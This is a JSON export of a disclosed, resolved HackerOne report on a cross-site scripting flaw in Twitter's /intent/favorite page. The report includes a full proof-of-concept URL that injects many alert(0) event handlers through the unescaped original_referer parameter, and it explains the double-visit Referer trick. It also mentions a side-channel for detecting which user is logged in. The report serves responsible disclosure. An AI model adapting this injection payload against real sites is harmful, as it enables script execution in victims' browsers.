{
  "id": 48516,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80ODUxNg==",
  "url": "https://hackerone.com/reports/48516",
  "title": "Redirect URL in /intent/ functionality is not properly escaped",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2015-02-21T23:47:32.767Z",
  "submitted_at": "2015-02-21T23:47:32.767Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "homakov",
    "url": "/homakov",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/182/88285f48615cb1af0146adb653ab45d18b47ad96_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 61,
    "url": "https://hackerone.com/x",
    "handle": "x",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "X / xAI",
      "twitter_handle": "XSecurity",
      "website": "https://x.com",
      "about": "X helps you create and share ideas and information instantly, without barriers."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2015-02-24T21:55:21.923Z",
  "bug_reporter_agreed_on_going_public_at": "2015-02-24T21:13:28.932Z",
  "team_member_agreed_on_going_public_at": "2015-02-24T21:55:21.412Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Choose a tweet from a user that the victim follows but not favorited. \r\n\r\nSend the victim message like \"Please favorite this: https://twitter.com/intent/favorite?original_referer=%20style%3Dfont-size%3A1000%3Bonautocompleteerror%3Dalert(0)%20onautocomplete%3Dalert(0)%20onwaiting%3Dalert(0)%20onvolumechange%3Dalert(0)%20ontoggle%3Dalert(0)%20ontimeupdate%3Dalert(0)%20onsuspend%3Dalert(0)%20onsubmit%3Dalert(0)%20onstalled%3Dalert(0)%20onshow%3Dalert(0)%20onselect%3Dalert(0)%20onseeking%3Dalert(0)%20onseeked%3Dalert(0)%20onscroll%3Dalert(0)%20onresize%3Dalert(0)%20onreset%3Dalert(0)%20onratechange%3Dalert(0)%20onprogress%3Dalert(0)%20onplaying%3Dalert(0)%20onplay%3Dalert(0)%20onpause%3Dalert(0)%20onmousewheel%3Dalert(0)%20onmouseup%3Dalert(0)%20onmouseover%3Dalert(0)%20onmouseout%3Dalert(0)%20onmousemove%3Dalert(0)%20onmouseleave%3Dalert(0)%20onmouseenter%3Dalert(0)%20onmousedown%3Dalert(0)%20onloadstart%3Dalert(0)%20onloadedmetadata%3Dalert(0)%20onloadeddata%3Dalert(0)%20onload%3Dalert(0)%20onkeyup%3Dalert(0)%20onkeypress%3Dalert(0)%20onkeydown%3Dalert(0)%20oninvalid%3Dalert(0)%20oninput%3Dalert(0)%20onfocus%3Dalert(0)%20onerror%3Dalert(0)%20onended%3Dalert(0)%20onemptied%3Dalert(0)%20ondurationchange%3Dalert(0)%20ondrop%3Dalert(0)%20ondragstart%3Dalert(0)%20ondragover%3Dalert(0)%20ondragleave%3Dalert(0)%20ondragenter%3Dalert(0)%20ondragend%3Dalert(0)%20ondrag%3Dalert(0)%20ondblclick%3Dalert(0)%20oncuechange%3Dalert(0)%20oncontextmenu%3Dalert(0)%20onclose%3Dalert(0)%20onclick%3Dalert(0)%20onchange%3Dalert(0)%20oncanplaythrough%3Dalert(0)%20oncanplay%3Dalert(0)%20oncancel%3Dalert(0)%20onblur%3Dalert(0)%20onabort%3Dalert(0)%20onwebkitfullscreenerror%3Dalert(0)%20onwebkitfullscreenchange%3Dalert(0)%20onwheel%3Dalert(0)%20onselectstart%3Dalert(0)%20onsearch%3Dalert(0)%20onpaste%3Dalert(0)%20oncut%3Dalert(0)%20oncopy%3Dalert(0)%20onbeforepaste%3Dalert(0)%20onbeforecut%3Dalert(0)%20onbeforecopy%3Dalert(0)&tweet_id=440322224407314432 where 440322224407314432 is that tweet id\r\n\r\nThe problem is original_referer is not escaped if current Referrer is twitter.com. However it's very hard to get Referer like that because t.co is used everywhere and it kills Referers. So we are going to use this functionality itself twice to get proper Header. \r\n\r\nNormally twitter ignores user supplied \"original_referer\" unless Referer is twitter.com \r\n\r\nWhen the victim clicks the link it shows a dialog with \"Favorite\" button which has a hidden field in it:\r\n \r\n<input type=\"hidden\" name=\"referer\" value=\"/intent/favorite?original_referer=%20style%3Dfont-size%3A1000%3Bonautocompleteerror%3Dalert(0)%20onautocomplete%3Dalert(0)%20onwaiting%3Dalert(0)%20onvolumechange%3Dalert(0)%20ontoggle%3Dalert(0)%20ontimeupdate%3Dalert(0)%20onsuspend%3Dalert(0)%20onsubmit%3Dalert(0)%20onstalled%3Dalert(0)%20onshow%3Dalert(0)%20onselect%3Dalert(0)%20onseeking%3Dalert(0)%20onseeked%3Dalert(0)%20onscroll%3Dalert(0)%20onresize%3Dalert(0)%20onreset%3Dalert(0)%20onratechange%3Dalert(0)%20onprogress%3Dalert(0)%20onplaying%3Dalert(0)%20onplay%3Dalert(0)%20onpause%3Dalert(0)%20onmousewheel%3Dalert(0)%20onmouseup%3Dalert(0)%20onmouseover%3Dalert(0)%20onmouseout%3Dalert(0)%20onmousemove%3Dalert(0)%20onmouseleave%3Dalert(0)%20onmouseenter%3Dalert(0)%20onmousedown%3Dalert(0)%20onloadstart%3Dalert(0)%20onloadedmetadata%3Dalert(0)%20onloadeddata%3Dalert(0)%20onload%3Dalert(0)%20onkeyup%3Dalert(0)%20onkeypress%3Dalert(0)%20onkeydown%3Dalert(0)%20oninvalid%3Dalert(0)%20oninput%3Dalert(0)%20onfocus%3Dalert(0)%20onerror%3Dalert(0)%20onended%3Dalert(0)%20onemptied%3Dalert(0)%20ondurationchange%3Dalert(0)%20ondrop%3Dalert(0)%20ondragstart%3Dalert(0)%20ondragover%3Dalert(0)%20ondragleave%3Dalert(0)%20ondragenter%3Dalert(0)%20ondragend%3Dalert(0)%20ondrag%3Dalert(0)%20ondblclick%3Dalert(0)%20oncuechange%3Dalert(0)%20oncontextmenu%3Dalert(0)%20onclose%3Dalert(0)%20onclick%3Dalert(0)%20onchange%3Dalert(0)%20oncanplaythrough%3Dalert(0)%20oncanplay%3Dalert(0)%20oncancel%3Dalert(0)%20onblur%3Dalert(0)%20onabort%3Dalert(0)%20onwebkitfullscreenerror%3Dalert(0)%20onwebkitfullscreenchange%3Dalert(0)%20onwheel%3Dalert(0)%20onselectstart%3Dalert(0)%20onsearch%3Dalert(0)%20onpaste%3Dalert(0)%20oncut%3Dalert(0)%20oncopy%3Dalert(0)%20onbeforepaste%3Dalert(0)%20onbeforecut%3Dalert(0)%20onbeforecopy%3Dalert(0)&amp;tweet_id=440322224407314432\"> \r\n\r\nThe victim sees Return to previous site link and when clicks, it instantly loads the same page with original_referer=Injection.\r\n\r\nInjection is inserted \"as is\" and it can overwrite CSS styles of the link and also inject malicious events in mouseover etc.\r\n\r\nProbably there's a better or more reliable way to make XSS payload execute, but I can't find it with blackbox.\r\n\r\nHow i noticed that? There's another bug i was making a tool for - probing username of current user from given database listening to side channel - twitter does window.close() if the user both follows & favorited this tweet. Demo http://homakov.github.io/twitterdetect.html \r\nNot sure if you want to fix that one too? ",
  "weakness": {
    "id": 60,
    "name": "Cross-site Scripting (XSS) - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 29840,
      "file_name": "Screen_Shot_2015-02-22_at_6.16.51_AM.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/029/840/0c858c1f8c9bc63ef4cb8c421668485e97c36646/Screen_Shot_2015-02-22_at_6.16.51_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2015-02-22_at_6.16.51_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2015-02-22_at_6.16.51_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ27WHNDNT%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T194051Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIHwe6yIoTYEUsl0L9FsGsfUPcNT96OjDqYBp7G%2FZwY%2BvAiB1A8lNv7Y9is5MPFSPd%2FIfwfPvFddtZ%2FPk520IbPwoYyqxBQg0EAMaDDAxMzYxOTI3NDg0OSIMIW5WT4vXFtXeskadKo4FIoCImmk57lAbD%2BVJvJQoNAt8mgG1wqLBFskuqdId4Dh5DrBZvMdDEsHXUnMMth3%2Bf%2FoLrOnoKYpvlsBA4NsdbxTt6j0ahj%2BnOuUBln%2BJCLQWss16F5FyNTWU8u%2BQMHNVbo1OhKaiJKeWaQ4HMDO4S14rUceENjuwcNVEIWAmPEqnIj4Uzqlb2F%2B5osc70DR8yQIdyhvAr4DfFmi82QxKQAO%2Fs%2FHXhCsNd%2B%2BVHgqnWBhuRcV%2F%2BJLRptcBVrNkbWvjJjA8UuZWM11qOYyNaED4Mad4%2BEOEpFjSLbD2L3Ybwq3sIDHRxdFLCYzFfca%2FbNxoX2LNzOfjdZoNcApuYAmYUQA2B7B5JohmS5b9eQWGAgdzf7nkDnuSCUI4rQ4xpOISDgWOiEq9j2EyqgxkDUVhOjAKIVOnCPEfsm23Q%2BnGLXMaw88K48%2Bg1lpP8HpvKMGUHQqSapt2t%2FjL8BN2CL%2BZXgvW%2B1NKsHS6vaGwPhKyuRnmXJ1bpmWq4ycXQzJzDXWdBbvrAWEGmZki%2BPLfsSg8BUT%2BWJ2qh0BtXG5qw1IUkMuFaAEYZoXQz0GeTqQPlIWNji%2BWC%2BFr95agRl08nGpBOHM9oi7osYn6UycKqgwIIoEdf9hzwm6QbmlPYKrwJ5cCNpWy8mV7hLJXu31PA%2F3H6jxj7sg9sYRZTMQVp0Gx1FL5IuV5O%2B%2B58nNrT88NyD2s71jlCxgdvh%2FuziZHbsSFj%2FFf3Ib6d95NNUJ5JWa1fOfcWx6U%2FOOG9a%2FxgzaNtNJ5svHQ1iWblN42khsHZ3zha12ScefreDJNAr7h%2FBJrziIhqkaxda8eDa2OXa9UAksYSZTV%2BK9etAJL8QxCOSCILkqqn0xw1j%2F8PRCNGfczMMjDxsYGOrIB6hXEVZ3aSKfbL8T4X62PVa%2FqoTLI8go6fUrto3D9Msf9m1QoDi4lyMhJ4a0%2F7f3e7bjv1YjhVjLg3Kx0mkgfTE9%2BnIGEZQsbaIOCbRsPylTnUTk4LTKUzdLwg0ycC%2FrRDeC8vkxEm6LwsO%2B6mP3HW5Bofx9HhZF%2BqcFnQOExVh0BuN6KEvxraKf8%2FGDU%2FBBzqUOfI0I0BTeFWUT8xcMGo6VLNvYB1TmOsPJKF%2BNUHD9sbw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5f67c6ff8d63efbcb33768f16f41b59ae8c0c2828dbddd92d22c98d3fb2260a3",
      "file_size": 99521,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 29841,
      "file_name": "Screen_Shot_2015-02-22_at_6.19.33_AM.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/029/841/8a03caf012f61bf1ec3ea3307d9722cbdca01299/Screen_Shot_2015-02-22_at_6.19.33_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2015-02-22_at_6.19.33_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2015-02-22_at_6.19.33_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ27WHNDNT%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T194051Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIHwe6yIoTYEUsl0L9FsGsfUPcNT96OjDqYBp7G%2FZwY%2BvAiB1A8lNv7Y9is5MPFSPd%2FIfwfPvFddtZ%2FPk520IbPwoYyqxBQg0EAMaDDAxMzYxOTI3NDg0OSIMIW5WT4vXFtXeskadKo4FIoCImmk57lAbD%2BVJvJQoNAt8mgG1wqLBFskuqdId4Dh5DrBZvMdDEsHXUnMMth3%2Bf%2FoLrOnoKYpvlsBA4NsdbxTt6j0ahj%2BnOuUBln%2BJCLQWss16F5FyNTWU8u%2BQMHNVbo1OhKaiJKeWaQ4HMDO4S14rUceENjuwcNVEIWAmPEqnIj4Uzqlb2F%2B5osc70DR8yQIdyhvAr4DfFmi82QxKQAO%2Fs%2FHXhCsNd%2B%2BVHgqnWBhuRcV%2F%2BJLRptcBVrNkbWvjJjA8UuZWM11qOYyNaED4Mad4%2BEOEpFjSLbD2L3Ybwq3sIDHRxdFLCYzFfca%2FbNxoX2LNzOfjdZoNcApuYAmYUQA2B7B5JohmS5b9eQWGAgdzf7nkDnuSCUI4rQ4xpOISDgWOiEq9j2EyqgxkDUVhOjAKIVOnCPEfsm23Q%2BnGLXMaw88K48%2Bg1lpP8HpvKMGUHQqSapt2t%2FjL8BN2CL%2BZXgvW%2B1NKsHS6vaGwPhKyuRnmXJ1bpmWq4ycXQzJzDXWdBbvrAWEGmZki%2BPLfsSg8BUT%2BWJ2qh0BtXG5qw1IUkMuFaAEYZoXQz0GeTqQPlIWNji%2BWC%2BFr95agRl08nGpBOHM9oi7osYn6UycKqgwIIoEdf9hzwm6QbmlPYKrwJ5cCNpWy8mV7hLJXu31PA%2F3H6jxj7sg9sYRZTMQVp0Gx1FL5IuV5O%2B%2B58nNrT88NyD2s71jlCxgdvh%2FuziZHbsSFj%2FFf3Ib6d95NNUJ5JWa1fOfcWx6U%2FOOG9a%2FxgzaNtNJ5svHQ1iWblN42khsHZ3zha12ScefreDJNAr7h%2FBJrziIhqkaxda8eDa2OXa9UAksYSZTV%2BK9etAJL8QxCOSCILkqqn0xw1j%2F8PRCNGfczMMjDxsYGOrIB6hXEVZ3aSKfbL8T4X62PVa%2FqoTLI8go6fUrto3D9Msf9m1QoDi4lyMhJ4a0%2F7f3e7bjv1YjhVjLg3Kx0mkgfTE9%2BnIGEZQsbaIOCbRsPylTnUTk4LTKUzdLwg0ycC%2FrRDeC8vkxEm6LwsO%2B6mP3HW5Bofx9HhZF%2BqcFnQOExVh0BuN6KEvxraKf8%2FGDU%2FBBzqUOfI0I0BTeFWUT8xcMGo6VLNvYB1TmOsPJKF%2BNUHD9sbw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=89135933256ad7e7ffc968c849ea3f260f290ea0e5cc5bced6d1a808ec01ebf1",
      "file_size": 83714,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2015-03-26T21:13:44.912Z",
  "allow_singular_disclosure_after": -331165626.3063975,
  "singular_disclosure_allowed": true,
  "vote_count": 3,
  "voters": [
    "sameerphad72",
    "shivammusic",
    "archsolar"
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
